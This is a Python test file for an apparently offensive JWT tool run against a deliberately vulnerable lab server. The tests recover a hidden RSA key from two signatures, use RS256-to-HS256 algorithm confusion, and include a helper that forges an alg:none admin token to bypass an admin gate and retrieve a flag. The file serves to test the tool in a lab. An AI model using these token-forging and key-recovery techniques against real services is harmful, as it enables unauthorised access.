"""The "algorithm confusion with NO exposed public key" scenario.

A second, hidden RSA keypair signs tokens for /api/noexposedkey, served on its own
origin with NO JWKS. tanuki therefore cannot discover the key and must RECOVER it
from two signatures (derive-modulus-from-two-signatures), then run RS256->HS256
confusion to bypass the admin gate.

Note: the end-to-end test performs a real 2048-bit e=65537 recovery (seconds with
gmpy2), so it is the slowest test in the suite.
"""
import base64
import json
import subprocess
import sys
from pathlib import Path

import pytest
import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

REPO_ROOT = Path(__file__).resolve().parent.parent
REC_PUB_PATH = REPO_ROOT / "lab" / "keys" / "recovery_public.pem"
# tanuki's JWKS probe paths — none of these may answer on the no-key origin
JWKS_PROBE_PATHS = ("/.well-known/jwks.json", "/.well-known/openid-configuration",
                    "/jwks.json", "/jwks", "/keys", "/api/keys", "/api/jwks",
                    "/openapi.json")


# ── helpers ───────────────────────────────────────────────────────────────────
def _b64url(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()


def _forge_admin_none():
    """An alg:none admin token the trusts-alg verify accepts."""
    return "%s.%s." % (_b64url({"alg": "none", "typ": "JWT"}),
                       _b64url({"sub": "administrator", "role": "admin", "iss": "x"}))


def _ne_login(base_url, user="wiener"):
    r = requests.post(base_url + "/login-noexposedkey", json={"user": user}, timeout=5)
    r.raise_for_status()
    return r.json()["token"]


def _verifies_under(pub, token):
    h, p, s = token.split(".")
    sig = base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    try:
        pub.verify(sig, f"{h}.{p}".encode(), padding.PKCS1v15(), hashes.SHA256())
        return True
    except Exception:
        return False


def _run_cli(args, timeout=180):
    proc = subprocess.run([sys.executable, "-m", "tanuki", *args],
                          cwd=str(REPO_ROOT), stdin=subprocess.DEVNULL,
                          capture_output=True, text=True, timeout=timeout)
    return proc.stdout + proc.stderr


# ── the key is genuinely not exposed ───────────────────────────────────────────
def test_main_jwks_excludes_recovery_key(base_url):
    jwks = requests.get(base_url + "/.well-known/jwks.json", timeout=5).json()
    rec_n = serialization.load_pem_public_key(
        REC_PUB_PATH.read_bytes()).public_numbers().n
    for k in jwks.get("keys", []):
        n = int.from_bytes(base64.urlsafe_b64decode(
            k["n"] + "=" * (-len(k["n"]) % 4)), "big")
        assert n != rec_n, "recovery key leaked via JWKS"


def test_noexposed_origin_serves_no_jwks(noexposed_base_url):
    for path in JWKS_PROBE_PATHS:
        r = requests.get(noexposed_base_url + path, timeout=5)
        assert r.status_code == 404, "%s should not exist on the no-key origin" % path


def test_recovery_key_not_leaked_in_responses(noexposed_base_url):
    rec_n = serialization.load_pem_public_key(
        REC_PUB_PATH.read_bytes()).public_numbers().n
    bodies = [
        requests.get(noexposed_base_url + "/", timeout=5).text,
        requests.post(noexposed_base_url + "/login-noexposedkey",
                      json={"user": "wiener"}, timeout=5).text,
        requests.get(noexposed_base_url + "/api/noexposedkey", timeout=5).text,
        requests.get(noexposed_base_url + "/api/noexposedkey",
                     headers={"Authorization": "Bearer not.a.token"}, timeout=5).text,
    ]
    for body in bodies:
        assert "BEGIN PUBLIC KEY" not in body and "BEGIN RSA" not in body
        assert str(rec_n) not in body               # decimal modulus never leaks


# ── two sequential logins: different tokens, same hidden key ───────────────────
def test_two_logins_differ_same_key(noexposed_base_url):
    t1 = _ne_login(noexposed_base_url)
    t2 = _ne_login(noexposed_base_url)
    assert t1 != t2, "sequential logins must differ (varied iat/exp/jti)"
    rec_pub = serialization.load_pem_public_key(REC_PUB_PATH.read_bytes())
    assert _verifies_under(rec_pub, t1) and _verifies_under(rec_pub, t2), \
        "both tokens must verify under the one hidden recovery key"


# ── baseline gating on the new endpoint ────────────────────────────────────────
def test_endpoint_rejects_user_accepts_forged_admin(noexposed_base_url):
    user_tok = _ne_login(noexposed_base_url)
    r_user = requests.get(noexposed_base_url + "/api/noexposedkey",
                          cookies={"session": user_tok}, timeout=5)
    assert r_user.status_code == 403                 # valid RS256 user token, gated

    r_admin = requests.get(noexposed_base_url + "/api/noexposedkey",
                           cookies={"session": _forge_admin_none()}, timeout=5)
    assert r_admin.status_code == 200
    assert "FLAG{no_exposed_key_recovered}" in r_admin.text


# ── end-to-end: recover the key from two sigs, then bypass (SLOW) ───────────────
def test_e2e_recovery_then_bypass(noexposed_base_url):
    t1 = _ne_login(noexposed_base_url)
    t2 = _ne_login(noexposed_base_url)
    out = _run_cli([t1, "--derive-key", t2,
                    "-u", noexposed_base_url + "/api/noexposedkey",
                    "--cookie", "session", "--claims", "role=admin",
                    "--no-crack", "--http", "-q", "--no-color"], timeout=180)
    # JWKS discovery found nothing, so derivation ran and recovered the key ...
    assert "recovered RSA public key" in out, out[-3000:]
    # ... and a forged admin token got in (403 -> 200)
    assert "ACCESS BYPASS" in out, out[-3000:]

    # independently confirm a forged admin token is accepted on the endpoint
    r = requests.get(noexposed_base_url + "/api/noexposedkey",
                     cookies={"session": _forge_admin_none()}, timeout=5)
    assert r.status_code == 200 and "FLAG{no_exposed_key_recovered}" in r.text
